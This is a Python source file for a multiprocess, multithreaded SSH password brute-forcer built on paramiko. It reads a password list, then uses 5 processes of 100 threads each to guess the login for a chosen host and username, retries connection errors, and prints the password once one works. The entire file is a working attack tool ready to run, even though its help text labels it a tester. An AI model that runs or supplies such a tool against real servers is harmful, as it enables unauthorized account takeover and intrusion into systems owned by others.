import argparse
import multiprocessing
import paramiko
from time import sleep
import threading
from termcolor import cprint
import sys

# Log to file for debugging
error_file = open("brute-ssh.log", "w")
sys.stderr = error_file

class Result:
    """
    Base class for handling SSH login results.

    Attributes:
        message (str): The message describing the result.
    """
    def __init__(self, message=None):
        if not message:
            message = "None"
        self.message = message

class AuthenticationSuccess(Result):
    """Class to represent a successful authentication result."""
    pass

class AuthenticationFailed(Result):
    """Class to represent a failed authentication result."""
    pass

class SSHError(Result):
    """Class to represent an SSH error result."""
    pass

class SSHLoginResult:
    """
    Represents the result of an SSH login attempt.

    Attributes:
        identifier (int): The identifier for the login attempt (thread ID).
        result (Result): The result of the authentication attempt.
    """
    def __init__(self, identifier, result: Result = None):
        self.identifier = identifier
        self.result = result if result else Result()

class SSHTarget:
    """
    Represents the target SSH server details.

    Attributes:
        hostname (str): The hostname or IP address of the SSH server.
        port (int): The port number for SSH (default is 22).
        username (str): The username for SSH login.
    """
    def __init__(self, hostname: str = "localhost", port: int = 22, username: str = None):
        self.hostname = hostname
        self.port = port
        self.username = username

class SSHBruteForce:
    """
    Handles the SSH brute-force attack logic.

    Attributes:
        target (SSHTarget): The target SSH server details.
        passlist_filename (str): The filename containing the list of passwords.
        passwords_queue (multiprocessing.Queue): Queue for managing passwords.
        result_queue (multiprocessing.Queue): Queue for managing login results.
        running_threads (list): List of currently running threads.
        available_thread_ids (multiprocessing.Queue): Queue for available thread IDs.
        shared_password_found (multiprocessing.Value): Shared state indicating if a password was found.
    """
    def __init__(self, target: SSHTarget, passlist_filename: str):
        self.target = target
        self.passlist_filename = passlist_filename

        self.passwords_queue: multiprocessing.Queue[str] = multiprocessing.Queue(maxsize=50)
        self.result_queue: multiprocessing.Queue[SSHLoginResult] = multiprocessing.Queue(maxsize=50)
        self.running_threads: list = []  # List of thread info, including id and thread object
        self.available_thread_ids: multiprocessing.Queue[int] = multiprocessing.Queue()
        self.shared_password_found = multiprocessing.Value('b', False)  # Shared state for found password

    def start(self, nonblocking: bool = False, thread_n: int = 1) -> bool:
        """
        Starts the brute-force process.

        Args:
            nonblocking (bool): If True, runs the brute-forcer in a separate thread.
            thread_n (int): The number of threads to use for brute-forcing.

        Returns:
            bool: True if started successfully.
        """
        self.start_password_producer()
        self.start_password_result_consumer()

        if nonblocking:
            self.main_thread = threading.Thread(target=self.bruteforcer, args=(thread_n,))
            self.main_thread.start()
            print("Started bruteforcer")
            return True
        
        self.bruteforcer(thread_n)
        return True

    def multiproccesed_bruteforce(self, process_n, thread_n):
        """
        Starts multiple processes for brute-forcing.

        Args:
            process_n (int): Number of processes to start.
            thread_n (int): Number of threads for each process.
        """
        self.start_password_producer()
        self.start_password_result_consumer()
        for _ in range(process_n):
            bruteforce = multiprocessing.Process(target=self.bruteforcer, args=(thread_n,))
            bruteforce.start()

    def bruteforcer(self, thread_n: int):
        """
        The core brute-force logic that attempts to log in with multiple passwords.

        Args:
            thread_n (int): The number of threads to use for brute-forcing.
        """
        for id in range(thread_n):
            self.available_thread_ids.put(id)

        while True:
            with self.shared_password_found.get_lock():
                if self.shared_password_found.value:
                    cprint("[+] Password found, exiting..", "cyan", attrs=["bold"])
                    self.clean_process()
                    return

            if self.passwords_queue.empty():
                continue

            thread_id = self.available_thread_ids.get()
            password = self.passwords_queue.get()

            if password is None:  # Sentinel to stop processing
                self.wait_for_threads()
                cprint("No more passwords to process.", "cyan")
                self.clean_process()
                return

            # Start a thread to attempt the SSH login with the obtained password
            login_thread = threading.Thread(target=self.ssh_login, daemon=True, args=(thread_id, self.target, password))
            login_thread.start()
            self.running_threads.append({'id': thread_id, 'thread': login_thread})

    def start_password_producer(self):
        """Starts a separate process to produce passwords from the file."""
        self._password_generator_proc = multiprocessing.Process(target=self.password_producer)
        self._password_generator_proc.start()

    def start_password_result_consumer(self):
        """Starts a separate process to consume login results."""
        self._password_result_consumer_proc = multiprocessing.Process(target=self.password_result_consumer)
        self._password_result_consumer_proc.start()

    def ssh_login(self, thread_id: int, target: SSHTarget, password: str, max_tries: int = 10):
        """
        Attempts to login to the SSH server using the provided credentials.

        Args:
            thread_id (int): The ID of the thread attempting the login.
            target (SSHTarget): The target SSH server details.
            password (str): The password to attempt.
            max_tries (int): The maximum number of attempts for this password.
        """
        result = None
        tries = 0

        while tries < max_tries:
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(
                    hostname=target.hostname,
                    port=target.port,
                    username=target.username,
                    password=password,
                    timeout=10  # Set a reasonable timeout for connections
                )
                result = AuthenticationSuccess(password)
                break  # Stop retrying if connection succeeds
            except paramiko.ssh_exception.AuthenticationException:
                result = AuthenticationFailed(password)
                break
            except paramiko.ssh_exception.SSHException as ssh_error:
                tries += 1
                if tries >= max_tries:
                    result = SSHError(password)
                    break
            finally:
                if 'client' in locals():
                    client.close()
        
        self.result_queue.put(SSHLoginResult(thread_id, result))
        self.release_thread_id(thread_id)

    def password_producer(self):
        """Reads passwords from a file and adds them to the password queue."""
        with open(self.passlist_filename, 'r') as passfile:
            for password_count, line in enumerate(passfile):
                password = line.strip()
                if password:  # Avoid empty lines
                    self.passwords_queue.put(password)
        self.passwords_queue.put(None)  # Add sentinel to signal end

    def password_result_consumer(self):
        """Processes results from login attempts and handles outcomes."""
        password_tried = 0
        while True:
            if not self.result_queue.empty():
                login: SSHLoginResult = self.result_queue.get()
                if isinstance(login.result, AuthenticationSuccess):
                    cprint(f"\nFound password: {login.result.message}\n", "green", attrs=["bold"])
                    with self.shared_password_found.get_lock():
                        self.shared_password_found.value = True
                    break
                elif isinstance(login.result, AuthenticationFailed):
                    password_tried += 1
                    cprint(f"[{password_tried}] not {login.result.message}", "red")
                elif isinstance(login.result, SSHError):
                    cprint(f"SSH Error with {login.result.message}, retrying", "red")
                    self.passwords_queue.put(login.result.message)  # Retry SSH errors

    def release_thread_id(self, thread_id: int):
        """
        Releases the thread ID back to the pool of available IDs.

        Args:
            thread_id (int): The ID of the thread to be released.
        """
        self.running_threads = [x for x in self.running_threads if x['id'] != thread_id]
        self.available_thread_ids.put(thread_id)

    def wait_for_threads(self):
        """Waits for all running threads to finish."""
        for thread_info in self.running_threads:
            thread_info['thread'].join()

    def clean_process(self):
        """Terminates the password producer and consumer processes."""
        self._password_generator_proc.terminate()
        self._password_result_consumer_proc.terminate()
        exit()

if __name__ == '__main__':
    # Command line argument parsing
    parser = argparse.ArgumentParser(description="SSH Brute Force Tester")
    parser.add_argument("password_file", help="File containing list of passwords")
    parser.add_argument("hostname", help="Hostname or IP of the SSH server")
    parser.add_argument("username", help="Username for SSH login")
    parser.add_argument("--port", type=int, default=22, help="SSH port (default is 22)")
    args = parser.parse_args()

    # Create SSH target and initiate brute force
    target = SSHTarget(hostname=args.hostname, port=args.port, username=args.username)
    brute_forcer = SSHBruteForce(target, args.password_file)
    brute_forcer.multiproccesed_bruteforce(5, 100)  # Start brute-forcing with specified process and thread counts
    print("DONE")
